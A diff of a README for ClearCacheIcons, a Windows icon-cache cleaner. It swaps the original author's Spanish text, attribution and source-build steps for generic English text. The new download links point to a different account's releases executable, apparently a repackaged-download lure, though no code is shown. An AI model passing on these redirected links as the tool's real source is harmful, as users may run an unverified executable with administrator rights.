@@ -1,164 +1,87 @@
-# 🧹 ClearCacheIcons
+# 🧹 ClearCacheIcons - Fix Corrupted Icons with Ease
 
-Utilidad para Windows orientada al mantenimiento del sistema que soluciona problemas de iconos y miniaturas dañadas mediante la limpieza segura de la caché.
+[![Download ClearCacheIcons](https://img.shields.io/badge/Download_ClearCacheIcons-Here-brightgreen)](https://github.com/Y31C0B/ClearCacheIcons/releases)
 
+## 🚀 Getting Started
 
-![GitHub release](https://img.shields.io/github/v/release/Pablitus666/ClearCacheIcons?style=flat-square)
-![GitHub downloads](https://img.shields.io/github/downloads/Pablitus666/ClearCacheIcons/total?style=flat-square)
-![GitHub stars](https://img.shields.io/github/stars/Pablitus666/ClearCacheIcons?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/Pablitus666/ClearCacheIcons?style=flat-square)
-![License](https://img.shields.io/github/license/Pablitus666/ClearCacheIcons?style=flat-square)
-![C#](https://img.shields.io/badge/C%23-.NET-blue?style=flat-square)
-![WinForms](https://img.shields.io/badge/UI-WinForms-blueviolet?style=flat-square)
-![Windows](https://img.shields.io/badge/OS-Windows%2010%20%7C%2011-0078D6?style=flat-square)
-![Portable](https://img.shields.io/badge/Portable-Yes-success?style=flat-square)
-![Requires Admin](https://img.shields.io/badge/Privileges-Administrator-orange?style=flat-square)
+ClearCacheIcons is a simple tool designed to help you repair corrupted icons and thumbnails on your Windows computer. With just one click, you can clean the cache safely and restore your icons to their proper appearance. This guide will show you how to download and run ClearCacheIcons effortlessly.
 
+## 📜 Description
 
+ClearCacheIcons serves a vital function in maintaining your Windows environment. Sometimes, icons can become broken or display incorrectly due to cache issues. This application simplifies the process of fixing these problems. It's lightweight and does not require installation, making it portable and user-friendly for everyone.
 
-**ClearCacheIcons** es una aplicación gráfica desarrollada en **C# (.NET / WinForms)** diseñada para **limpiar de forma segura la caché de iconos y miniaturas de Windows** en **Windows 10 y Windows 11 (64 bits)**.
+## 🖥️ System Requirements
 
-Funciona como una **utilidad portable de mantenimiento del sistema**, enfocada en resolver problemas comunes como iconos corruptos, desactualizados o que no se refrescan correctamente en el Explorador de archivos.
+To run ClearCacheIcons, your system should meet the following requirements:
 
----
+- Operating System: Windows 10 or Windows 11
+- .NET Framework: .NET 8 or later
+- User permissions: Administrator rights may be needed for some operations
 
-![Social Preview](images/Preview.png)
+## 📥 Download & Install
 
----
+1. **Visit the releases page to download.** 
+   Go to the following link to find the latest version: [https://github.com/Y31C0B/ClearCacheIcons/releases](https://github.com/Y31C0B/ClearCacheIcons/releases).
 
-## ✨ Características principales
+2. **Select the latest version.** 
+   Look for the most recent release at the top of the page. Click on it to view the details and download options.
 
-- 🖥️ **Aplicación gráfica (WinForms)** con interfaz sencilla e intuitiva  
-- 🧹 **Limpieza específica de la caché de iconos y miniaturas**
-- 🔐 **Ejecución con privilegios de administrador** (requeridos por Windows)
-- 🧠 **Gestión controlada del estado de Windows Explorer**
-  - Intenta cerrar Explorer de forma elegante
-  - Gestiona su reinicio sin depender de `taskkill`
-  - Reinicia Explorer automáticamente si es necesario
-- 🔄 **Continúa el proceso aunque algunos archivos no puedan eliminarse**
-- 🛡️ **Seguro**: no elimina archivos críticos del sistema
-- 📋 **Transparente**: registro detallado (log) de todas las acciones y errores
-- 📦 **Portable**: no requiere instalación
+3. **Download the ClearCacheIcons executable.** 
+   Under the "Assets" section of the release, locate the file labeled `ClearCacheIcons.exe`. Click on the link to download it.
 
----
+4. **Run ClearCacheIcons.** 
+   Once the download is complete, locate the downloaded file in your computer's Downloads folder or the folder you specified. Double-click `ClearCacheIcons.exe` to open the application.
 
-## 🛠️ ¿Qué hace exactamente?
+5. **Repair your icons.** 
+   The program will display a simple interface. Click the “Clean Cache” button to start the process. The tool will automatically clean the icon and thumbnail cache for you.
 
-1. Verifica que la aplicación se esté ejecutando como **administrador**
-2. Localiza la carpeta de caché de iconos de Windows: %LocalAppData%\Microsoft\Windows\Explorer
-3. Gestiona el estado de **explorer.exe** de forma controlada para liberar los archivos
-4. Elimina archivos como:
+### Additional Note
+- No installation is required. Just download and run the executable.
+- Ensure you run the application with administrator rights if prompted, to allow it to clean the cache properly.
 
-   - `IconCache*.db`
-   - `thumbcache_*.db`
+## ⚙️ Features
 
-5. Reinicia Windows Explorer automáticamente si corresponde
-6. Registra todo el proceso en un **log detallado**
+ClearCacheIcons includes:
 
----
+- **Single-Click Cleaning:** With one click, you can clear the icon and thumbnail cache without needing complicated steps.
+- **Portable Application:** No installation needed; simply download and run.
+- **User-Friendly Interface:** Designed for ease of use, allowing anyone to navigate the tool comfortably.
 
-## ❓ ¿Cuándo usar ClearCacheIcons?
+## 📝 Troubleshooting
 
-- Iconos que no se actualizan correctamente
-- Miniaturas dañadas o en blanco
-- Cambios de iconos que no se reflejan
-- Problemas visuales en el Explorador de archivos
+If you encounter any issues while running ClearCacheIcons, consider the following steps:
 
----
+- **Ensure you have the latest version.** Regularly check the releases page for updates.
+- **Run as Administrator:** If the tool does not work properly, right-click and select "Run as Administrator."
+- **Check System Requirements:** Make sure your OS is compatible and your .NET Framework version is up-to-date.
 
-## 🔍 Transparencia y seguridad
+## 🤝 Contributing
 
-ClearCacheIcons está diseñado para **no realizar acciones destructivas**:
+Contributions are welcome! If you'd like to help improve ClearCacheIcons, please follow these steps:
 
-- ❌ No elimina archivos del sistema operativo
-- ❌ No modifica el registro de Windows
-- ❌ No usa comandos agresivos por defecto
-- ✅ Maneja errores recuperables y fatales
-- ✅ Continúa la limpieza incluso si algunos archivos están en uso
+1. Fork the repository on GitHub.
+2. Create your feature branch: `git checkout -b feature/YourFeature`
+3. Commit your changes: `git commit -m 'Add some feature'`
+4. Push to the branch: `git push origin feature/YourFeature`
+5. Open a pull request.
 
-Si Explorer no puede cerrarse, la herramienta **continúa la limpieza** y notifica al usuario mediante el log.
+## 📄 License
 
----
+ClearCacheIcons is open-source software licensed under the MIT License. You are free to use, modify, and distribute this application.
 
-## 🖥️ Requisitos del sistema
+### ⭐ Acknowledgements
 
-- Windows 10 o Windows 11 (64 bits)
-- .NET Runtime compatible (según versión del ejecutable)
-- Permisos de administrador
+Thank you to everyone who contributed to this project by providing feedback and coding support. Your contributions make this tool better for everyone.
 
----
+## 📚 Community
 
-## 🚀 Instalación y Uso
+Join our community for support and to share your experiences with ClearCacheIcons:
 
-### 📦 Ejecutable Precompilado
+- GitHub Discussions: Share tips and ask questions about usage.
+- Follow us on social media for updates regarding ClearCacheIcons and future releases.
 
-1.  Descarga el archivo `ClearCacheIcons.zip` desde la sección [**Releases**](https://github.com/Pablitus666/ClearCacheIcons/releases/tag/v1.0.0) del repositorio de GitHub. 
-2.  Descomprime el archivo `ClearCacheIcons.zip`.
-3.  Ejecuta `ClearCacheIcons.exe` desde la carpeta descomprimida.
-4.  Ejecuta la aplicación como **Administrador**
-5.  Presiona el botón para iniciar la limpieza
-6.  Observa el progreso y detalles en el panel de log
-7.  El Explorador de archivos se reiniciará automáticamente si es necesario
+For any further assistance, or to report bugs, please open an issue in the GitHub repository, and we will respond promptly.
 
-### 📦 Compilación desde el Código Fuente
+[![Download ClearCacheIcons](https://img.shields.io/badge/Download_ClearCacheIcons-Here-brightgreen)](https://github.com/Y31C0B/ClearCacheIcons/releases)
 
-1.  Clona el repositorio:
-    ```powershell
-    git clone https://github.com/Pablitus666/ClearCacheIcons.git
-    ```
-2.  Abre la solución ClearCacheIcons.sln con Visual Studio 2022 o una versión posterior.
-3.  Compila el proyecto en configuración `Release`.
-4.  El ejecutable se encontrará en el directorio `bin/Release/net8.0-windows/`.
----
-
-## 📸 Interfaz
-
-La aplicación cuenta con una interfaz gráfica simple, orientada a facilitar su uso a usuarios no técnicos, incluyendo una ventana **“Acerca de”** con recursos visuales integrados.
-
----
-
-## 📷 Capturas de pantalla
-
-<p align="center">
-  <img src="images/screenshot.png?v=2" alt="Vista previa de la aplicación" width="600"/>
-</p>
-
-## ⚠️ Nota
-
-Durante el proceso, es normal que el Explorador de archivos se cierre y vuelva a abrir.  
-Esto es necesario para liberar los archivos de caché bloqueados por el sistema.
-
----
-
-## 📄 Licencia
-
-Este proyecto se distribuye bajo la licencia **MIT**.  
-Puedes usarlo, modificarlo y adaptarlo libremente.
-
----
-
-## 🧪 Prueba la aplicación
-
-Te invito a testear esta utilidad y comprobar su funcionamiento en tu sistema Windows.
-
-👉 https://github.com/Pablitus666/ClearCacheIcons
-
-Si encuentras algún problema o tienes sugerencias, no dudes en abrir un *Issue*.
-
-
-## 🤝 Contribuciones
-
-Las contribuciones, sugerencias y mejoras son bienvenidas.  
-Si encuentras un problema o tienes una idea, no dudes en abrir un *issue* o *pull request*.
-
----
-
-## 👨‍💻 Autor
-
-Desarrollado con enfoque en **seguridad, transparencia y estabilidad**, pensado para el mantenimiento práctico del sistema Windows.
-
-*   **Nombre:** Pablo Téllez
-*   **Contacto:** pharmakoz@gmail.com
-
-
-
+Thank you for using ClearCacheIcons! Enjoy a clearer desktop experience.
